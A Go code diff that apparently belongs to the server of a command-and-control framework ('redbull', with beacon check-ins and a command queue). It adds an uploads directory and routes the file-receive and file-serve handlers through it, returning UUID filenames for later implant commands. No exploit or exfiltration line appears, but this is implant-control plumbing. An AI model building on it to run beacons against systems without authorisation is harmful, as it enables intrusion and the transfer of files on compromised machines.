@@ -23,6 +23,7 @@ var cmdQueue = rbqueue.NewQueue[string]()
 var responses = rbhttp.NewBeaconResponses()
 var lastCheckIn time.Time
 var fileStoragePath string
+var uploadStoragePath string
 
 func init() {
 	logger := zap.Must(zap.NewDevelopment())
@@ -34,12 +35,16 @@ func init() {
 		zap.L().Fatal("Failed to get home directory", zap.Error(err))
 	}
 	fileStoragePath = filepath.Join(homeDir, ".redbull", "files")
+	uploadStoragePath = filepath.Join(homeDir, ".redbull", "uploads")
 
-	// Create the directory if it doesn't exist
+	// Create the directories if they don't exist
 	if err := os.MkdirAll(fileStoragePath, 0755); err != nil {
 		zap.L().Fatal("Failed to create file storage directory", zap.Error(err), zap.String("path", fileStoragePath))
 	}
-	zap.L().Info("File storage initialized", zap.String("path", fileStoragePath))
+	if err := os.MkdirAll(uploadStoragePath, 0755); err != nil {
+		zap.L().Fatal("Failed to create upload storage directory", zap.Error(err), zap.String("path", uploadStoragePath))
+	}
+	zap.L().Info("File storage initialized", zap.String("files", fileStoragePath), zap.String("uploads", uploadStoragePath))
 }
 
 func errorResponse(w http.ResponseWriter, r *http.Request, status int, msg string) {
@@ -71,8 +76,9 @@ func checkIn(w http.ResponseWriter, r *http.Request) {
 }
 
 func downloadFile(w http.ResponseWriter, r *http.Request) {
-	// Create destination file
-	filePath := filepath.Join(fileStoragePath, uuid.New().String())
+	// Generate UUID filename for the uploaded file
+	uuidFilename := uuid.New().String()
+	filePath := filepath.Join(uploadStoragePath, uuidFilename)
 	destFile, err := os.Create(filePath)
 	if err != nil {
 		zap.L().Error("downloadFile - create file", zap.Error(err))
@@ -91,10 +97,12 @@ func downloadFile(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	responses.Append(*rbhttp.NewBeaconResponse("saved file to disk", fmt.Sprintf("saved file to disk: %s", filePath), "", fileStoragePath))
+	responses.Append(*rbhttp.NewBeaconResponse("saved file to disk", fmt.Sprintf("saved file to disk: %s", filePath), "", uploadStoragePath))
 
 	render.Status(r, 200)
-	render.JSON(w, r, rbhttp.NewCommandResponse{Success: true})
+
+	// Return just the UUID filename (not the full path) so it can be used in the upload command
+	render.JSON(w, r, map[string]string{"filename": uuidFilename})
 }
 
 func response(w http.ResponseWriter, r *http.Request) {
@@ -165,13 +173,13 @@ func downloadFileFromServer(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// Prevent directory traversal attacks
 	if filepath.Base(filename) != filename {
 		errorResponse(w, r, 400, "invalid filename")
 		return
 	}
 
-	filePath := filepath.Join(fileStoragePath, filename)
+	// Serve files from uploads directory (where UI uploads go)
+	filePath := filepath.Join(uploadStoragePath, filename)
 
 	// Check if file exists
 	fileInfo, err := os.Stat(filePath)
